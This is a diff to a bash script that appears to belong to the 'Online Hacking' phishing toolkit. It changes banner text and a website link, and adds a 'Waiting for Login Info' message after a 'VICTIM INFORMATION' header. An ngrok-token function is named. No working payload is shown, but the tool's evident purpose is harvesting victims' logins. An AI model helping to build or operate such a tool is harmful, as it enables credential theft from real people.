@@ -68,7 +68,7 @@ logo_last
                            echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
 			   echo ""
 			   echo ""
-			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================= \e[93m" 
+			   echo -e "\e[96m=========================\e[92m Online Hacking \e[96m========================= \e[93m" 
                            echo ""
 askuri_c
 clear
@@ -95,7 +95,7 @@ logo_last
                            echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
 			   echo ""
 			   echo ""
-			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================= \e[93m" 
+			   echo -e "\e[96m=========================\e[92m Online Hacking \e[96m========================= \e[93m" 
                            echo ""
 askuri_n
 clear
@@ -446,7 +446,7 @@ SUMAN ©\e[34m
     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝   
 ONLINE HACKING			  							  							  
           \e[m"
-echo -e " \e[36mWebsite : \e[0m\e[92mwww.onlinehacking.in  \e[93m/  \e[92mwww.onlinehacking.xyz  "
+echo -e " \e[36mWebsite : \e[0m\e[92mwww.onlinehacking.in  \e[93m/  \e[92mwww.onlinehacking.org  "
 echo ""
 echo -e " \e[31mGitHub : \e[0m\e[93mhttps://github.com/OnlineHacKing  "
 echo ""
@@ -470,6 +470,8 @@ links_c() {
 			   echo ""
 			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================= \e[93m" 
                            echo ""
+			   echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m \e[0m\e[1;95m Waiting for Login Info, \e[92mCtrl + C \e[1;95mto exit... "
+			   echo ""
 }
 
 links_n() {
@@ -486,6 +488,8 @@ links_n() {
 			   echo ""
 			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================= \e[93m" 
                            echo ""
+			   echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m \e[0m\e[1;95m Waiting for Login Info, \e[92mCtrl + C \e[1;95mto exit... "
+			   echo ""
 }
 
 ngroktoken() {
